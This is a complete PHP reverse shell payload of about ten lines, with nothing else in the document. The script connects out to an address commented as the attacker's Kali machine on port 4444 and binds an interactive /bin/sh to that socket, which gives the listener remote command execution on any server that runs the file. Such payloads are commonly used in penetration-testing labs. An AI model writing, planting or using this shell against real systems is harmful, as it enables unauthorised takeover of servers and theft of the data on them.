<?php
$ip = '192.168.1.22';  // Kali/Attacker IP
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open("/bin/sh -i", [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?>
